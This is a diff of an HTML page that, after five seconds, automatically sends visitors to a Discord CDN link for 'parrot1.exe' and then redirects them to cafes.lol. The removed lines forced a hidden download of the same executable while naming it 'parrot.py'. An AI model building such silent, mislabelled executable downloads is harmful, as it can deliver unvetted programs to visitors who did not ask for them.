@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirect to File Download</title>
+    <title>Download Page</title>
     <style>
         body {
             background-color: #fca4a6;
@@ -13,29 +13,21 @@
     </style>
 </head>
 <body>
-    <h1 id="message">You will be redirected to download a file in a few seconds...</h1>
+    <h1 id="message">Parrot.exe will download in a few seconds...</h1>
 
     <script>
         setTimeout(function() {
-            // Construct the download link for the "parrot.py" file
-            var downloadLink = 'files/parrot1.exe';
+            // Replace this link with your Discord attachment link
+            var downloadLink = 'https://cdn.discordapp.com/attachments/1158580871239053312/1162910762067566632/parrot1.exe?ex=653da80b&is=652b330b&hm=0ab8a25f08318850695f781801fab5923ada25bee7a29ce2c8769edbae06b3a0&';
+            window.location.href = downloadLink;
 
-            // Create an invisible anchor element to trigger the download
-            var anchor = document.createElement('a');
-            anchor.href = downloadLink;
-            anchor.download = 'parrot.py';
-            anchor.style.display = 'none';
-            document.body.appendChild(anchor);
-            anchor.click();
-            document.body.removeChild(anchor);
-            
             // Change the message after download
             document.getElementById('message').textContent = 'Thanks for downloading!';
-
-            // Redirect to "cafes.lol" after a 5-second delay
+            
+            // Redirect to cafes.lol after 3 seconds
             setTimeout(function() {
                 window.location.href = 'https://cafes.lol';
-            }, 5000); // 5000 milliseconds = 5 seconds
+            }, 3000); // 3000 milliseconds = 3 seconds
         }, 5000); // 5000 milliseconds = 5 seconds
     </script>
 </body>
